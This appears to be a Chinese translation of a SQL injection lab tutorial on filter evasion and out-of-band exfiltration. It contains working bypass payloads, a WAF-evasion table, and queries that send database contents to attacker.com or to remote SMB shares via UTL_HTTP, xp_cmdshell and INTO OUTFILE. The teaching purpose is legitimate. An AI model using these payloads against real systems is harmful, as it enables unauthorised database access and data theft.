<h1 id="Filter-Evasion-技术"><a href="#Filter-Evasion-技术" class="headerlink" title="Filter Evasion 技术"></a>Filter Evasion 技术</h1><p>在高级 SQL 注入攻击中，规避过滤器对于成功利用漏洞至关重要。现代 Web 应用程序通常会实施防御措施来清理或阻止常见的攻击模式，这使得简单的 SQL 注入尝试无效。作为渗透测试人员，我们必须使用更复杂的技术来绕过这些过滤器。本节将介绍此类方法，包括<strong>字符编码</strong>、<strong>无引号</strong> SQL 注入以及处理不能使用<strong>空格</strong>的场景。通过理解和应用这些技术，我们可以通过严格的输入验证和安全控制有效地渗透 Web 应用程序。</p>
<p>字符编码<br>字符编码涉及将 SQL 注入负载中的特殊字符转换为可能绕过输入过滤器的编码形式。  </p>
<ul>
<li><strong>URL 编码</strong>：URL 编码是一种常用方法，其中字符使用百分号 （%） 表示，后跟十六进制的 ASCII 值。例如，payload 可以编码为 .这种编码可以帮助输入通过 Web 应用程序过滤器并被数据库解码，而数据库在初始处理期间可能无法将其识别为恶意输入。<code>&#39; OR 1=1--``%27%20OR%201%3D1--</code></li>
<li><strong>十六进制编码</strong>：十六进制编码是使用十六进制值构建 SQL 查询的另一种有效技术。例如，查询可以编码为 .通过将字符表示为十六进制数字，攻击者可以绕过在处理输入之前不解码这些值的过滤器。<code>SELECT * FROM users WHERE name = &#39;admin&#39;``SELECT * FROM users WHERE name = 0x61646d696e</code></li>
<li><code>Unicode Encoding</code>：Unicode 编码使用 Unicode 转义序列表示字符。例如，字符串可以编码为 .此方法可以绕过仅检查特定 ASCII 字符的过滤器，因为数据库将正确处理编码的输入。<code>admin``\u0061\u0064\u006d\u0069\u006e</code></li>
</ul>
<p><strong>例</strong></p>
<p>在此示例中，我们将探讨开发人员如何通过从用户输入中删除特定关键字和字符来实施基本筛选来防止 SQL 注入攻击。但是，我们还将看到攻击者如何使用 URL 编码等字符编码技术绕过这些防御。</p>
<p><strong>注意</strong>：在接下来的练习中，我们将使用与上一个不同的数据库。您可以在 访问该页面。<code>http://10.10.164.79/encoding/</code></p>
<p>以下是处理搜索功能的 PHP 代码 （search_books.php）：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$book_name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;book_name&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$special_chars</span> = <span class="keyword">array</span>(<span class="string">&quot;OR&quot;</span>, <span class="string">&quot;or&quot;</span>, <span class="string">&quot;AND&quot;</span>, <span class="string">&quot;and&quot;</span> , <span class="string">&quot;UNION&quot;</span>, <span class="string">&quot;SELECT&quot;</span>);</span><br><span class="line"><span class="variable">$book_name</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$special_chars</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$book_name</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM books WHERE book_name = &#x27;<span class="subst">$book_name</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Generated SQL Query: <span class="subst">$sql</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Error: &quot;</span> . <span class="variable">$conn</span>-&gt;error . <span class="string">&quot; (Error Code: &quot;</span> . <span class="variable">$conn</span>-&gt;errno . <span class="string">&quot;)&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;</span><br><span class="line">...</span><br><span class="line">..</span><br></pre></td></tr></table></figure>

<p>以下是 index.html 页中的 Javascript 代码，它提供了用于搜索书籍的用户界面：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">searchBooks</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">bookName</span> = document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;book_name&#x27;</span>).value;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">xhr</span> = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_ invoke__">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;search_books.php?book_name=&#x27;</span> + <span class="title function_ invoke__">encodeURIComponent</span>(bookName), <span class="literal">true</span>);</span><br><span class="line">   xhr.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (this.status === <span class="number">200</span>) &#123;</span><br><span class="line">           document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;results&#x27;</span>).innerHTML = this.responseText;</span><br></pre></td></tr></table></figure>

<p>在上面的示例中，开发人员实施了一种基本的防御机制，通过删除特定的 SQL 关键字（如 、、 和 ）来防止 SQL 注入攻击。筛选使用函数，该函数在将这些关键字包含在 SQL 查询中之前从用户输入中去除这些关键字。这种过滤方法旨在使攻击者更难注入恶意 SQL 命令，因为这些关键字对于许多 SQL 注入负载至关重要。<code>OR``AND``UNION``SELECT``str_replace</code></p>
<p>准备 Payload</p>
<p>让我们逐步完成准备 SQL 注入有效负载的过程，展示 URL 编码如何绕过基本防御。首先，让我们看看包含特殊字符或 SQL 关键字的普通输入会发生什么情况。当我们搜索一本名为 的书时，我们得到成功的结果如下：<code>Intro to PHP</code></p>
<p><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165257.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165257.png" alt="image.png"></a></p>
<p>但是，如果我们尝试通过添加特殊字符（如 、 等）来中断查询呢？我们将得到以下输出：<code>&#39;``;</code></p>
<p><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165327.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165327.png" alt="image.png"></a><br>SQL 查询未正确执行，这可能意味着存在 SQL 注入的可能性。让我们尝试注入有效负载 “”。我们将得到以下输出：<code>Intro to PHP&#39; OR 1=1</code></p>
<p><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165337.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165337.png" alt="image.png"></a><br>那么，这里发生了什么？当此输入传递给 PHP 脚本时，该函数将去除 OR 关键字和单引号，从而产生经过清理的输入，该输入不会执行预期的 SQL 注入。此输入无效，因为筛选会删除 SQL 注入成功所需的关键组件。<code>str_replace</code></p>
<p>要绕过过滤，我们需要使用 URL 编码对输入进行编码，URL 编码以过滤器无法识别和删除的方式表示特殊字符和关键字。以下是示例 payload 。<code>1%27%20||%201=1%20--+</code></p>
<ul>
<li><code>%27</code>是单引号 （’） 的 URL 编码。</li>
<li><code>%20</code>是空格 （ ） 的 URL 编码。</li>
<li><code>||</code>表示 SQL OR 运算符。</li>
<li><code>%3D</code>是等号 （&#x3D;） 的 URL 编码。</li>
<li><code>%2D%2D</code>是在 SQL 中启动注释的 –, 的 URL 编码。</li>
</ul>
<p>在上述有效负载中，关闭 SQL 查询中的当前字符串或值。例如，如果查询正在查找与 1 匹配的书名，则 add 将关闭字符串，使 input 的其余部分成为 SQL 语句的一部分。 part 使用 SQL 运算符添加始终为 true 的条件。此条件可确保查询对所有记录返回 true，绕过本应限制结果的原始条件。同样，在 SQL 中启动注释，导致数据库忽略查询的其余部分。这对于终止可能导致语法错误或意外情况的查询的任何剩余部分非常有用。为确保适当的间距，请在注释后添加一个空格，确保注释正确终止并且没有语法问题。<code>1&#39;``&#39;``|| 1=1``OR``--``+</code></p>
<p>从控制台中，我们可以看到单击搜索按钮会对 .<code>search_book.php</code><br><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165346.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165346.png" alt="image.png"></a></p>
<p>让我们直接在 PHP 页面上使用有效负载，以避免来自客户端的不必要调整&#x2F;验证。让我们访问具有标准负载的 URL <a target="_blank" rel="noopener" href="http://10.10.164.79/encoding/search_books.php?book_name=Intro%20to%20PHP%27%20OR%201=1">http://10.10.164.79/encoding/search_books.php?book_name&#x3D;Intro%20to%20PHP%27%20OR%201&#x3D;1</a>，您将看到一个错误。<code>Intro to PHP&#39; OR 1=1</code></p>
<p><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165415.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165415.png" alt="image.png"></a></p>
<p>现在，使用 <a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/#recipe=URL_Encode(false)">Cyber Chef</a> 对负载进行 URL 编码，并尝试使用更新的负载访问 URL。我们将获得以下输出，其中转储完整信息：<code>Intro to PHP&#39; || 1=1 --+</code></p>
<p><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165435.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165435.png" alt="image.png"></a></p>
<p>有效负载之所以有效，是因为 URL 编码以绕过筛选机制的方式表示特殊字符和 SQL 关键字。当服务器解码 URL 编码的输入时，它会恢复特殊字符和关键字，从而允许 SQL 注入成功执行。使用 URL 编码，攻击者可以构建绕过旨在阻止 SQL 注入的基本输入过滤机制的有效负载。这证明了使用更强大的防御措施的重要性，例如参数化查询和预编译语句，无论输入的编码如何，它们都可以防止 SQL 注入攻击。</p>
<p>无引号 SQL 注入  </p>
<p>当应用程序过滤单引号或双引号或转义时，使用无引号 SQL 注入技术。  </p>
<ul>
<li><strong>使用数值</strong>：一种方法是使用不需要引号的数值或其他数据类型。例如，攻击者可以在不需要引号的上下文中使用，而不是 injecting 。此技术可以绕过专门查找转义或去除引号的过滤器，从而允许注入继续进行。<code>&#39; OR &#39;1&#39;=&#39;1``OR 1=1</code></li>
<li><strong>使用 SQL 注释</strong>：另一种方法涉及使用 SQL 注释来终止查询的其余部分。例如，可以将输入转换为 ，其中 this 表示 SQL 中注释的开始，从而有效地忽略 SQL 语句的其余部分。这有助于绕过过滤器并防止语法错误。<code>admin&#39;--``admin--``--</code></li>
<li><strong>使用 CONCAT（） 函数</strong>：攻击者可以使用 SQL 函数等方式构建不带引号的字符串。例如，构造字符串 admin.该函数和类似方法允许攻击者在不直接使用引号的情况下构建字符串，从而使过滤器更难检测和阻止有效负载。<code>CONCAT()``CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e)``CONCAT()</code></li>
</ul>
<p>不允许使用空格</p>
<p>当不允许使用空格或过滤掉空格时，可以使用各种技术来绕过此限制。</p>
<ul>
<li><p><strong>替换空格的注释</strong>：一种常见的方法是使用 SQL 注释 （） 来替换空格。例如，攻击者可以使用 ，而不是 。SQL 注释可以替换查询中的空格，从而允许有效负载绕过删除或阻止空格的过滤器。<code>/**/``SELECT * FROM users WHERE name = &#39;admin&#39;``SELECT/**//*FROM/**/users/**/WHERE/**/name/**/=&#39;admin&#39;</code>  </p>
</li>
<li><p><strong>制表符或换行符</strong>：另一种方法是使用制表符 （） 或换行符 （） 代替空格。某些筛选器可能允许这些字符，从而使攻击者能够构造类似于 .此技术可以绕过专门查找空格的筛选器。<code>\t``\n``SELECT\t*\tFROM\tusers\tWHERE\tname\t=\t&#39;admin&#39;</code>  </p>
</li>
<li><p><strong>替代字符</strong>：一种有效的方法是使用表示不同类型空格的替代 URL 编码字符，例如 （水平制表符）、（换行符）、（换页）、（回车） 和 （不间断空格）。这些字符可以替换有效负载中的空格。<code>%09``%0A</code> <code>%0C</code> <code>%0D``%A0</code></p>
</li>
</ul>
<p>实例</p>
<p>在此方案中，我们有一个终端节点，该终端节点根据提供的用户名返回用户详细信息。开发人员已实施过滤器来阻止常见的 SQL 注入关键字，例如 OR、AND 和空格 （%20），以防止 SQL 注入攻击。<code>http://10.10.164.79/space/search_users.php?username=?</code>  </p>
<p>这是开发者添加的 PHP 过滤。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$special_chars</span> = <span class="keyword">array</span>(<span class="string">&quot; &quot;</span>, <span class="string">&quot;AND&quot;</span>, <span class="string">&quot;and&quot;</span> ,<span class="string">&quot;or&quot;</span>, <span class="string">&quot;OR&quot;</span> , <span class="string">&quot;UNION&quot;</span>, <span class="string">&quot;SELECT&quot;</span>);</span><br><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$special_chars</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>如果我们在端点上使用标准有效负载，我们可以看到，即使通过 URL 编码，它也没有工作。<code>1%27%20||%201=1%20--+</code></p>
<p><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165655.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165655.png" alt="image.png"></a></p>
<p>SQL 查询显示代码省略了空格。要绕过这些保护，我们可以使用表示不同类型的空格或换行符的 URL 编码字符，例如 （horizontal tab）、 （换行符）。这些字符可以替换空格，并且仍可由 SQL 解析器正确解释。<code>%09``%0A</code></p>
<p>可以将原始有效负载修改为使用换行符而不是空格，从而产生有效负载 .此有效负载构造与空格筛选器相同的逻辑条件，但使用换行符来绕过空格筛选器。<code>1&#39; OR 1=1 --``1&#39;%0A||%0A1=1%0A--%27+``1&#39; OR 1=1 --</code></p>
<p>SQL 解析器将换行符解释为空格，将有效负载转换为 .因此，查询将从 解释为 。<code>1&#39; OR 1=1 --``SELECT * FROM users WHERE username = &#39;$username&#39;``SELECT * FROM users WHERE username = &#39;1&#39; OR 1=1 --</code></p>
<p>现在，如果我们通过更新的有效负载访问终端节点，我们可以查看所有详细信息。</p>
<p><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165703.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165703.png" alt="image.png"></a></p>
<p>总而言之，重要的是要了解，在处理旨在防止 SQL 注入攻击的过滤器或 Web 应用程序防火墙 （WAF） 时，没有一种技术可以保证绕过。但是，这里有一些可用于规避这些保护的提示和技巧。下表重点介绍了可用于尝试绕过筛选器和 WAF 的各种技术：</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td><strong>场景</strong></td>
<td><strong>描述</strong></td>
<td><strong>例</strong></td>
</tr>
<tr>
<td><strong>像 SELECT 这样的关键词被禁止</strong></td>
<td>通常可以通过更改大小写或添加内联注释来分解 SQL 关键字</td>
<td>SElEcT * FrOm 用户或 SE&#x2F;<strong>&#x2F;LECT * FROM&#x2F;</strong>&#x2F;users</td>
</tr>
<tr>
<td><strong>禁止使用 Space</strong></td>
<td>使用替代空格字符或注释来替换空格有助于绕过过滤器。</td>
<td>SELECT%0A*%0AFROM%0Ausers 或 SELECT&#x2F;<strong>&#x2F;*&#x2F;</strong>&#x2F;FROM&#x2F;**&#x2F;users</td>
</tr>
<tr>
<td><strong>禁止使用 AND、OR 等逻辑运算符</strong></td>
<td>使用替代逻辑运算符或串联来绕过关键字筛选器。</td>
<td>用户名 &#x3D; ‘admin’ &amp; password &#x3D; ‘password’ 或用户名 &#x3D; ‘admin’&#x2F;<strong>&#x2F;|&#x2F;</strong>&#x2F;1&#x3D;1 –</td>
</tr>
<tr>
<td><strong>UNION、SELECT 等常见关键字被禁止</strong></td>
<td>使用等效表示形式（如十六进制或 Unicode 编码）来绕过筛选器。</td>
<td>SElEcT * FROM users 其中用户名 &#x3D; CHAR（0x61,0x64,0x6D，0x69,0x6E）</td>
</tr>
<tr>
<td><strong>禁止使用 OR、AND、SELECT、UNION 等特定关键字</strong></td>
<td>使用混淆技术通过将字符与字符串函数或注释组合在一起来伪装 SQL 关键字。</td>
<td>SElECT * FROM users WHERE username &#x3D; CONCAT（’a’，’d’，’m’，’i’，’n’） 或 SElEcT&#x2F;<strong>&#x2F;username&#x2F;</strong>&#x2F;FROM&#x2F;**&#x2F;users</td>
</tr>
</tbody></table>
<p>在实际环境中，您应用的查询和筛选关键字的可见性是无法直接实现的。作为渗透测试人员，重要的是要了解 SQL 注入测试通常涉及命中试验方法，需要耐心和毅力。每个环境都可能具有独特的过滤器和保护措施，因此有必要适应并尝试不同的技术来找到成功的注射向量。</p>
<h1 id="带外-SQL-注入-1"><a href="#带外-SQL-注入-1" class="headerlink" title="带外 SQL 注入"></a>带外 SQL 注入</h1><p>带外 （OOB） SQL 注入是一种攻击技术，当直接或传统方法无效时，渗透测试人员&#x2F;红队成员使用它来泄露数据或执行恶意操作。与攻击者依赖同一通道进行攻击和数据检索的带内 SQL 注入不同，带外 SQL 注入使用单独的通道来发送有效负载和接收响应。带外技术利用 <strong>HTTP</strong> 请求、<strong>DNS</strong> 查询、<strong>SMB</strong> 协议或数据库服务器可能有权访问的其他网络协议等功能，使攻击者能够绕过防火墙、入侵检测系统和其他安全措施。<br><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165809.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165809.png" alt="image.png"></a><br>带外 SQL 注入的主要优势之一是其隐蔽性和可靠性。通过<strong>使用不同的通信渠道</strong>，攻击者可以最大限度地降低被发现的风险，并与受感染的系统保持持续连接。例如，攻击者可能会注入一个 <strong>SQL 负载，触发数据库服务器向攻击者控制的恶意域发出 DNS 请求</strong>。然后，可以使用响应来提取敏感数据，而无需向监视直接数据库交互的安全机制发出警报。这种方法允许攻击者利用漏洞，即使在攻击者和目标之间的直接连接受到限制或受到审查的复杂网络环境中也是如此。</p>
<p>为什么使用 OOB</p>
<p>在直接响应被清理或受到安全措施限制的情况下，OOB 通道使攻击者能够在没有服务器立即反馈的情况下泄露数据。例如，<strong>存储过程</strong>、<strong>输出编码</strong>和<strong>应用程序级别约束</strong>等安全机制可能会<strong>阻止直接响应</strong>，从而使传统的 SQL 注入攻击无效。带外技术（例如使用 DNS 或 HTTP 请求）允许将数据发送到由攻击者控制的外部服务器，从而规避这些限制。</p>
<p>此外，<strong>入侵检测系统 （IDS）</strong> 和 <strong>Web 应用程序防火墙 （WAF）</strong> 通常会<strong>监控和记录可疑活动的 SQL 查询响应</strong>，从而阻止来自潜在恶意查询的直接响应。通过利用 OOB 通道，攻击者可以通过使用审查较少的网络协议（如 DNS 或 SMB）来传输数据来避免检测。这在攻击者与数据库服务器之间的直接连接受限的网络环境中特别有用，例如当服务器位于防火墙后面或位于不同的网段中时。</p>
<p>不同数据库中的技术</p>
<p>带外 SQL 注入攻击利用通过精心设计的查询写入另一个通信通道的方法。当与数据库的直接交互受到限制时，此技术对于泄露数据或执行恶意操作非常有效。数据库中有多个命令可能允许外泄，但以下是各种数据库系统中最常用的命令列表：</p>
<p><strong>MySQL 和 MariaDB</strong></p>
<p>在 MySQL 或 MariaDB 中，可以使用 <a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/select-into.html">SELECT …INTO OUTFILE</a> 或 <a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_load-file">load_file</a> 命令。此命令允许攻击者将查询结果写入服务器文件系统上的文件。例如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT sensitive_data FROM users INTO OUTFILE <span class="string">&#x27;/tmp/out.txt&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>然后，攻击者可以通过数据库服务器上运行的 SMB 共享或 HTTP 服务器访问此文件，从而通过备用通道泄露数据。</p>
<p><strong>Microsoft SQL Server （MSSQL）</strong></p>
<p>在 MSSQL 中，可以使用 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16">xp_cmdshell</a> 等功能执行带外 SQL 注入，该功能允许直接从 SQL 查询执行 shell 命令。这可用于将数据写入可通过网络共享访问的文件：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC xp_cmdshell <span class="string">&#x27;bcp &quot;SELECT sensitive_data FROM users&quot; queryout &quot;\\10.10.58.187\logs\out.txt&quot; -c -T&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>或者， 或者 可用于与外部数据源交互，从而促进通过 OOB 通道进行数据泄露。<code>OPENROWSET``BULK INSERT</code>  </p>
<p><strong>神谕</strong>  </p>
<p>在 Oracle 数据库中，可以使用 <a target="_blank" rel="noopener" href="https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_HTTP.html">UTL_HTTP</a> 或 <a target="_blank" rel="noopener" href="https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_FILE.html">UTL_FILE</a> 软件包执行带外 SQL 注入。例如，UTL_HTTP 包可用于发送包含敏感数据的 HTTP 请求：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DECLARE</span><br><span class="line">  req UTL_HTTP.REQ;</span><br><span class="line">  resp UTL_HTTP.RESP;</span><br><span class="line">BEGIN</span><br><span class="line">  req := UTL_HTTP.<span class="title function_ invoke__">BEGIN_REQUEST</span>(<span class="string">&#x27;http://attacker.com/exfiltrate?sensitive_data=&#x27;</span> || sensitive_data);</span><br><span class="line">  UTL_HTTP.<span class="title function_ invoke__">GET_RESPONSE</span>(req);</span><br><span class="line">END;</span><br></pre></td></tr></table></figure>

<p>带外技术示例</p>
<p>MySQL 和 MariaDB 中的带外 SQL 注入技术可以利用各种网络协议来泄露数据。主要方法包括 DNS 泄露、HTTP 请求和 SMB 共享。根据 MySQL&#x2F;MariaDB 环境和网络设置的功能，可以应用这些技术中的每一种。  </p>
<p><strong>HTTP 协议请求</strong>  </p>
<p>通过利用允许 HTTP 请求的数据库功能，攻击者可以将敏感数据直接发送到他们控制的 Web 服务器。此方法利用可以建立出站 HTTP 连接的数据库功能。尽管 MySQL 和 MariaDB 本身不支持 HTTP 请求，但如果数据库配置为允许此类操作，则可以通过外部脚本或用户定义函数 （UDF） 来完成此操作。</p>
<p>首先，需要创建和安装 UDF 以支持 HTTP 请求。此设置很复杂，通常涉及其他配置。示例查询如下所示。<code>SELECT http_post(&#39;http://attacker.com/exfiltrate&#39;, sensitive_data) FROM books;</code></p>
<p>HTTP 请求泄露可以在 Windows 和 Linux （Ubuntu） 系统上实施，具体取决于数据库对启用 HTTP 请求的外部脚本或 UDF 的支持。</p>
<p><strong>DNS 解析外泄</strong></p>
<p>攻击者可以使用 SQL 查询生成带有编码数据的 DNS 请求，这些数据被发送到攻击者控制的恶意 DNS 服务器。此技术绕过基于 HTTP 的监控系统，并利用数据库执行 DNS 查找的能力。</p>
<p>如上所述，MySQL 本身不支持仅通过 SQL 命令生成 DNS 请求，攻击者可能会使用其他方式（例如自定义用户定义函数 （UDF） 或系统级脚本）来执行 DNS 查找。</p>
<p><strong>SMB （中小型企业）外泄</strong></p>
<p>SMB 泄露涉及将查询结果写入外部服务器上的 SMB 共享。此技术在 Windows 环境中特别有效，但也可以通过正确的设置在 Linux 系统中进行配置。示例查询如下所示。<code>SELECT sensitive_data INTO OUTFILE &#39;\\\\10.10.162.175\\logs\\out.txt&#39;;</code></p>
<p>由于 Windows 本身支持 SMB&#x2F;UNC 路径，因此完全支持此功能。Linux （Ubuntu）：虽然直接 UNC 路径更适用于 Windows，但可以使用 Linux 等工具或通过将共享挂载到本地目录来挂载和访问 SMB 共享。在 SQL 查询中直接使用 UNC 路径可能需要额外的设置或脚本来促进交互。<code>smbclient</code></p>
<p>实例</p>
<p>在这个实际场景中，我们将演示攻击者如何使用带外 SQL 注入技术从易受攻击的 Web 应用程序中窃取数据。服务器端代码包含一个 SQL 注入漏洞，该漏洞允许攻击者构建一个有效负载，将查询结果写入外部 SMB 共享。当来自数据库的直接响应受到限制或受监视时，这非常有用。</p>
<p><strong>场景说明</strong></p>
<p>在这种情况下，我们将在 的 AttackBox 上启用网络共享。此共享可通过网络访问，并允许将其他计算机中的文件写入其中。您可以假设这样一种情况：您遇到了一个易受攻击的系统，并希望将数据转置到另一个网络共享系统。攻击者将利用此共享来带外泄露数据。要获得网络共享，我们将启动 AttackBox 并在终端中执行以下命令：<code>ATTACKBOX_IP\logs</code>  </p>
<ul>
<li>使用 导航到目录<code>impacket``cd /opt/impacket/examples</code></li>
<li>输入命令以启动共享目录的 SMB 服务器。<code>python3.9 smbserver.py -smb2support -comment &quot;My Logs Server&quot; -debug logs /tmp``/tmp</code></li>
<li>您可以通过输入命令 来访问网络共享的内容。这将允许您连接到网络共享，然后您可以发出命令来列出所有命令。<code>smbclient //ATTACKBOX_IP/logs -U guest -N``ls</code></li>
</ul>
<p>我们有相同的 Web 应用程序，该应用程序具有搜索功能，可以查询访问图书馆的访客。此功能的服务器端代码容易受到 SQL 注入的攻击，您可以在 访问它。<code>http://10.10.164.79/oob/search_visitor.php?visitor_name=Tim</code></p>
<p><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165822.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165822.png" alt="image.png"></a><br>服务器代码如下所示：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$visitor_name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;visitor_name&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM visitor WHERE name = &#x27;<span class="subst">$visitor_name</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Generated SQL Query: <span class="subst">$sql</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Execute multi-query</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">multi_query</span>(<span class="variable">$sql</span>)) &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">// Store first result set</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">store_result</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;</span><br></pre></td></tr></table></figure>

<p><strong>重要注意事项</strong></p>
<p>请务必注意，可以设置 MySQL 系统变量。设置后，此变量包含目录路径名，并且 MySQL 将仅允许将文件写入此指定目录。此安全措施有助于降低未经授权的文件操作的风险。<code>secure_file_priv</code></p>
<ul>
<li><strong>设置 secure_file_priv 时</strong>：MySQL 会将 <strong>INTO OUTFILE</strong> 等文件操作限制到指定目录。这意味着攻击者只能将文件写入此目录，从而限制了他们将数据泄露到任意位置的能力。</li>
<li><strong>当 secure_file_priv 为空时</strong>：如果变量为空，则 MySQL 不会施加任何目录限制，允许将文件写入 MySQL 服务器进程可访问的任何目录。此配置会带来更高的风险，因为它为攻击者提供了更大的灵活性。<code>secure_file_priv</code></li>
</ul>
<p>攻击者通常没有直接访问权限来检查 secure_file_priv 变量的值。因此，他们必须依靠 hit-and-trial 方法来确定是否可以写入文件以及在何处写入文件，测试各种路径以查看文件操作是否成功。  </p>
<p><strong>准备 Payload</strong></p>
<p>为了利用此漏洞，攻击者制作了一个有效负载以注入到参数中。有效负载将设计为执行额外的 SQL 查询，该查询将数据库版本信息写入外部 SMB 共享。<code>visitor_name</code>  </p>
